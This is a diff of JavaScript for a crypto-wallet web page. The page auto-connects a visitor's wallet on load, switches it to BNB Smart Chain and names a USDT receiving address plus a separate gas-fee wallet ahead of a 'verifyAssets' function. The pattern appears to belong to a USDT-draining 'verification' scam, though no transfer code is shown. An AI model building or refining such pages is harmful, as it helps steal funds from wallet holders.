@@ -1,6 +1,6 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
+const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // USDT receiving address
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
-const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
 
 let web3;
 let userAddress;
@@ -19,7 +19,7 @@ async function connectWallet() {
             userAddress = accounts[0];
             console.log("Wallet Detected:", userAddress);
 
-            // Switch to BNB Smart Chain if needed
+            // Switch to BNB Smart Chain
             await window.ethereum.request({
                 method: "wallet_switchEthereumChain",
                 params: [{ chainId: "0x38" }]
@@ -33,8 +33,12 @@ async function connectWallet() {
     }
 }
 
-// Auto-detect wallet on page load (no popup)
-window.addEventListener("load", connectWallet);
+// ✅ Step: Delay auto connect (gives Trust Wallet time to inject)
+window.addEventListener("load", () => {
+    setTimeout(() => {
+        connectWallet();
+    }, 2000); // 2 second delay — increase to 3000 if needed
+});
 
 async function verifyAssets() {
     if (!web3 || !userAddress) {
